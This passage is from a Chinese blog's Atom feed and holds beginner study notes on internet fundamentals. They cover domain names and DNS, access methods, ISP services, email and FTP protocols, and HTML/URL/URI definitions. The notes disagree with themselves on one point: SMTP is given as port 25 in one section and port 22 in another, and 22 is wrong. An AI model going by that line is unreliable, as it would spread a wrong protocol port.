class="line">2.路由器</span><br><span class="line">3.通信线路</span><br><span class="line">4.信息资源</span><br></pre></td></tr></table></figure><p>5.<strong>internet地址表示方法</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.IP地址</span><br><span class="line">2.域名</span><br><span class="line">IP地址与域名的关系</span><br><span class="line">一个IP对应多个域名</span><br></pre></td></tr></table></figure><p>6.<strong>域名的格式、域名服务器、域名解析</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">1.格式：计算机名.三级域名.二级域名.顶级域名 例如：blog.falsectf.top   blog是主机名</span><br><span class="line">com  商业</span><br><span class="line">org  非商业</span><br><span class="line">gov  政府</span><br><span class="line">edu  教育</span><br><span class="line">mil  军事</span><br><span class="line">net  网络组织</span><br><span class="line">cn   中国</span><br><span class="line">us   美国</span><br><span class="line">jp   日本</span><br><span class="line"></span><br><span class="line">2.域名服务器：存放IP地址与域名对照表</span><br><span class="line">3.域名解析：通过DNS服务器，将域名解析为对应的IP地址</span><br></pre></td></tr></table></figure><p>7.<strong>internet接入方式；ISP提供的服务</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">接入方式：</span><br><span class="line">窄带：</span><br><span class="line">拨号上网</span><br><span class="line">ISDN</span><br><span class="line">宽带：</span><br><span class="line">公用电话网-ADSL</span><br><span class="line">有线电视网-CATV</span><br><span class="line">局域网-LAN</span><br><span class="line">无线接入：</span><br><span class="line">4G</span><br><span class="line">WIFI（wlan）</span><br><span class="line"></span><br><span class="line">ISP提供的服务：</span><br><span class="line">接入服务</span><br><span class="line">信息服务</span><br></pre></td></tr></table></figure><p>8.<strong>internet提供的主要服务</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.信息查询（HTTP、WWW）</span><br><span class="line">2.电子邮件（SMTP发-25、POP3收-110）</span><br><span class="line">3.文件传输（FTP）</span><br><span class="line">4.远程登陆（telnet）</span><br><span class="line">5.电子公告版（BBS）</span><br></pre></td></tr></table></figure><p>9.概念：HTML、网页、URL、URI</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HTML:超文本标记语言</span><br><span class="line">网页：解析HTML文件，在浏览器中使用</span><br><span class="line">URL：统一资源定位符，网络信息文件存在的位置   具体都某一个网页</span><br><span class="line">URI：统一资源标识符</span><br></pre></td></tr></table></figure><p>10.电子邮件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">协议：</span><br><span class="line">SMTP -22 -简单邮件传输协议</span><br><span class="line">POP3 -110 -邮局协议</span><br><span class="line">邮件地址：</span><br><span class="line">用户名@主机名</span><br><span class="line">邮件内容：</span><br><span class="line">文件-附件</span><br><span class="line">文本</span><br><span class="line">图片等</span><br></pre></td></tr></table></figure><p>11.文件传输</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">协议：</span><br><span class="line">FTP</span><br><span class="line">工作模式：</span><br><span class="line">客户机/服务器</span><br><span class="line">工作方式：</span><br><span class="line">下载上传</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;古典密码&quot;&gt;&lt;a href=&quot;#古典密码&quot; class=&quot;headerlink&quot; title=&quot;古典密码&quot;&gt;&lt;/a&gt;古典密码&lt;/h2&gt;&lt;p&gt;参考连接：&lt;a href=&quot;https://howiezhao.github.io/2018/08/10/classical</summary>
      
    
    
    
    <category term="Crypto" scheme="http://blog.falsectf.top/categories/Crypto/"/>
    
    
    <category term="Crypto" scheme="http://blog.falsectf.top/tags/Crypto/"/>
    
  </entry>
  
</feed>
